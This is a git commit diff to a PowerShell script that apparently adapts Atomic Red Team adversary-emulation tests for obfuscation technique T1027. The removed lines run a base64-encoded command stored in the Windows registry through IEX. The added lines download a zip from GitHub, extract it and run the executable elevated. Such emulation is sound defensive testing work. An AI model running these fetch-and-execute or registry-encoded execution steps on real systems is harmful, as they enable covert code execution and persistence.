74495668ec5e0175ebf690715749b4d3516c50ed
keith.salandanan <keith.salandanan@oqulo.com>
2022-09-26 14:18:11 +0800

    Edited T1027

--- Persistence/T1027.ps1
+++ Persistence/T1027.ps1
@@ -1,12 +1,17 @@
-#Atomic Test #3 - Execute base64-encoded PowerShell from Windows Registry
+#Atomic Test #4 - Execution from Compressed File
 
-$OriginalCommand = 'Write-Host "Hey, Atomic!"'
-$Bytes = [System.Text.Encoding]::Unicode.GetBytes($OriginalCommand)
-$EncodedCommand =[Convert]::ToBase64String($Bytes)
-$EncodedCommand
+if (Test-Path $env:temp\temp_T1027.zip\T1027.exe) {
+    Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c ""%temp%\temp_T1027.zip\T1027.exe"'
+    exit 0
+}else{
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1027/bin/T1027.zip" -OutFile "$env:temp\T1027.zip"
+    Expand-Archive -path "$env:temp\T1027.zip" -DestinationPath "$env:temp\temp_T1027.zip\" -Force
 
-Set-ItemProperty -Force -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug -Value $EncodedCommand
-powershell.exe -Command "IEX ([Text.Encoding]::UNICODE.GetString([Convert]::FromBase64String((gp HKCU:Software\Microsoft\Windows\CurrentVersion Debug).Debug)))"
+    Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c ""%temp%\temp_T1027.zip\T1027.exe"'
+    exit 1}
 
 # Cleanup Commands:
-# Remove-ItemProperty -Force -ErrorAction Ignore -Path HKCU:Software\Microsoft\Windows\CurrentVersion -Name Debug
+#  Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "taskkill /f /im calculator.exe >nul 2>nul"'
+#  Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "rmdir /S /Q %temp%\temp_T1027.zip >nul 2>nul"'
+#  Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c "del /Q "%temp%\T1027.zip" >nul 2>nul"'
